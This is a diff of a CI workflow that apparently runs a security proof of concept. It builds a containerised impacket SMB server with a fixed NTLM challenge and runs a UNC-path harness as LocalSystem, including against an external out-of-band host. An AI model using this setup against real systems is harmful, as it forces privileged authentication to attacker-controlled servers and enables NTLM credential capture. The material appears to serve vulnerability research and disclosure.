@@ -13,29 +13,35 @@ jobs:
           $ErrorActionPreference='Stop'
           New-Item -ItemType Directory -Force C:/proof/share | Out-Null
           Set-Content C:/proof/share/marker.txt 'researcher-owned isolated proof'
-          python -m pip install --disable-pip-version-check impacket==0.13.0
-          Stop-Service LanmanServer -Force -ErrorAction SilentlyContinue
           @'
           import logging
           from impacket import smbserver
           logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(levelname)s %(message)s')
           s=smbserver.SimpleSMBServer(listenAddress='0.0.0.0', listenPort=445)
-          s.addShare('owned',r'C:\proof\share','owned proof')
+          s.addShare('owned',r'C:\\proof\\share','owned proof')
           s.setSMB2Support(True)
           s.setSMBChallenge('5444584e544c4d32')
           s.start()
           '@ | Set-Content C:/proof/smb.py
-          $p=Start-Process python -ArgumentList C:/proof/smb.py -RedirectStandardOutput C:/proof/smb.stdout -RedirectStandardError C:/proof/smb.stderr -PassThru
-          Set-Content C:/proof/smb.pid $p.Id
-          for($i=0;$i -lt 30;$i++){if(Get-NetTCPConnection -State Listen -LocalPort 445 -ErrorAction SilentlyContinue){break};Start-Sleep 1}
-          Get-NetTCPConnection -State Listen -LocalPort 445 | Format-Table -AutoSize
+          docker pull python:3.12-windowsservercore-ltsc2022
+          docker run -d --name smbproof --mount type=bind,source=C:\proof,target=C:\proof python:3.12-windowsservercore-ltsc2022 powershell -NoProfile -Command "python -m pip install --disable-pip-version-check impacket==0.13.0; python C:/proof/smb.py"
+          $ip=$null
+          for($i=0;$i -lt 120;$i++){
+            $ip=docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' smbproof
+            if($ip -and (Test-NetConnection $ip -Port 445 -InformationLevel Quiet -WarningAction SilentlyContinue)){break}
+            Start-Sleep 2
+          }
+          if(!$ip){docker logs smbproof;throw 'container no IP'}
+          Set-Content C:/proof/container-ip.txt $ip
+          Write-Output "SMB_CONTAINER_IP=$ip"
+          docker ps -a
           Get-FileHash ./profile5_unc_harness.exe -Algorithm SHA256
       - name: Run exact profile 5 analogue as LocalSystem
         shell: powershell
         run: |
           $ErrorActionPreference='Continue'
-          $ip=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -like '10.*' -or $_.IPAddress -like '172.*' -or $_.IPAddress -like '192.168.*'} | Select-Object -First 1 -ExpandProperty IPAddress)
-          if(!$ip){throw 'no private IP'}
+          $ip=(Get-Content C:/proof/container-ip.txt).Trim()
+          if(!$ip){throw 'no container IP'}
           $exe=(Resolve-Path ./profile5_unc_harness.exe).Path
           function Run-System([string]$name,[string]$unc,[string]$child,[string]$parent){
             $cmd="& '$exe' '$unc' '$child' *> '$parent'"
@@ -53,8 +59,7 @@ jobs:
           Start-Sleep 4
           Run-System beprof-oob "\\j9adzdnyijwvlprf--beprof1787402221.oob.blackmail.zip\owned\marker.txt" C:/proof/oob-child.txt C:/proof/oob-parent.txt
           Start-Sleep 8
-          Write-Output '=== SMB STDOUT ==='; Get-Content C:/proof/smb.stdout -ErrorAction SilentlyContinue
-          Write-Output '=== SMB STDERR ==='; Get-Content C:/proof/smb.stderr -ErrorAction SilentlyContinue
+          Write-Output '=== SMB CONTAINER LOG ==='; docker logs smbproof 2>&1
           Write-Output '=== LOCAL CHILD ==='; Get-Content C:/proof/local-child.txt -ErrorAction SilentlyContinue
           Write-Output '=== OOB CHILD ==='; Get-Content C:/proof/oob-child.txt -ErrorAction SilentlyContinue
           exit 0
